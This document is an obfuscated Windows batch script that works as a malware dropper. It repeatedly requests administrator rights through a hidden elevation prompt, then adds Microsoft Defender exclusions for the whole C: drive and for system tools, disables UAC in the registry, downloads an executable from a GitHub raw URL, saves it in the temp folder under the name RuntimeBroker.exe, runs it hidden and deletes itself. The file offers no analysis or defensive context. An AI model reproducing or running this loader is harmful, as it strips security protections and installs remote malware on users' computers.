@echo off & setlocal enableDelayedExpansion
set "rjEP=2>&1" & set "ozvvN=>nul" & set "shc=NET" & set "jiI=SESSION"
%shc% %jiI% %ozvvN% %rjEP%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "ccUYr=qux" & set "pvNf=bar" & set "OjtgX=baz" & set "TwR=foo" & rem JBrvW qOp vCjIOl
set "UpRn=powershell -ExecutionPolicy Bypass -Command"
set "hZwl=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "tQII='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "IKGm='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!UpRn! "!hZwl! !tQII! !IKGm!" %ozvvN% %rjEP%
set "PCqj=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "KlW=-Name 'EnableLUA' -Value 0"
!UpRn! "!PCqj! !KlW!" %ozvvN% %rjEP%
set "azbD=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!UpRn! "!azbD!" %ozvvN% %rjEP%
if !errorlevel! neq 0 (goto %a%)
set "HJrC=timeout /t" & !HJrC! 2 %ozvvN% %rjEP%
set "ptoIX=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "NNcDx=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "Bmxl=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!UpRn! "!ptoIX! !NNcDx! !Bmxl!" %ozvvN% %rjEP%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!HJrC! 1 %ozvvN% %rjEP% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %ozvvN% %rjEP%
del /f /q "%~f0" %ozvvN% %rjEP%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %ozvvN% %rjEP%
if !errorlevel! neq 0 (!HJrC! 3 %ozvvN% %rjEP% & goto %b%)
exit /b
